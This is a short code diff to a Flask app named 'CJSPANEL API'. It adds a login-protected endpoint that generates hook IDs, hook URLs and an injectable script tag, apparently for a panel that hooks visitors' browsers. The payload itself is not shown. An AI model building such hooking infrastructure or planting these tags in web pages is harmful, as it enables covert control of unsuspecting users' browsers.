@@ -183,12 +183,33 @@ def update_device_status(device_id, status="online"):
     c.close()
     conn.close()
 
+
 @app.route('/')
 def index():
     return jsonify({
         'status': 'CJSPANEL API Active',
         'version': '1.0.0',
         'frontend': 'https://cjspanel.netlify.app'
+    })
+
+@app.route('/generate_hook')
+@login_required
+def generate_hook():
+    """Generate a unique hook ID and return payload URLs"""
+    import random
+    import string
+    hook_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+    base_url = os.environ.get('BASE_URL', request.url_root.rstrip('/'))
+    
+    hook_url = f"{base_url}/hook/{hook_id}"
+    demo_url = f"{base_url}/demo?hook={hook_id}"
+    script_tag = f'<script src="{hook_url}"></script>'
+    
+    return jsonify({
+        'hook_id': hook_id,
+        'hook_url': hook_url,
+        'demo_url': demo_url,
+        'script_tag': script_tag
     })
 
 # ==================== API ROUTES ====================
